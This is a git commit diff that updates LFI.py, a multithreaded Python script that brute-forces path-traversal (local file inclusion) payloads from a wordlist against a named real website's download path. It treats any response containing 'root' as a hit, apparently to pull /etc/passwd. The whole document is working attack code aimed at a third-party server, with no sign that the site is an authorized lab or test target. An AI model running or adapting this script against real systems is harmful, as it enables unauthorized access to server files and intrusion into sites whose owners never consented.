790c7710d5e871c70d9598b1d159997f10705ab1
Marcus K <133644816+MarcusProgram@users.noreply.github.com>
2024-03-17 08:21:17 +0300

    Update LFI.py

--- LFI.py
+++ LFI.py
@@ -1,17 +1,45 @@
 #https://kpolyakov.spb.ru/download/
 import requests
+import threading
+
+
+def proccess_list(url, payload_list):
+    for payload in payload_list:
+        url_with_payload = url.replace('[LFI]', payload)
+        try:
+            r = requests.get(url_with_payload)
+        except Exception as e:
+            print(f'Error: {payload}')
+            print(e)
+            continue
+        if 'root' in r.text:
+            print(f'Code: {r.status_code}; Len: {len(r.content)}; Found: {payload}')
+            exit()
+            break
+        else:
+            print(f'Code: {r.status_code}; Len: {len(r.content)}; Not found: {payload}')
 
 
 # [LFI]
-url = 'https://kpolyakov.spb.ru/download[LFI]'
+url = 'https://kpolyakov.spb.ru/download/[LFI]'
+num_of_threads = 10
+threads = []
 
-with open('traversals-8-deep-exotic-encoding.txt', 'r') as f:
-    for line in f.readlines():
-        payload = line.strip()
-        url_with_payload = url.replace('[LFI]', payload)
-        r = requests.get(url_with_payload)
-        if r.status_code == 200:
-            print(f'Len: {len(r.content)}; Found: {payload}; Code: {r.status_code}; LINK {url+payload}')
-            break
-        else:
-            print(f'Len: {len(r.content)}; Not found: {payload}; Code: {r.status_code}; ')
+with open('traversals-8-deep-exotic-encoding.txt', 'r') as f:    
+    all_lines = f.readlines()
+    batch_len = len(all_lines) // num_of_threads
+
+    payload_list = []
+    for i in range(num_of_threads):
+        payload_list.append(all_lines[i*batch_len:(i+1)*batch_len])
+
+    for i in range(num_of_threads):
+        t = threading.Thread(target=proccess_list, args=(url, payload_list[i]))
+        t.start()
+        threads.append(t)
+
+
+for t in threads:
+    t.join()
+
+print("Finished!")
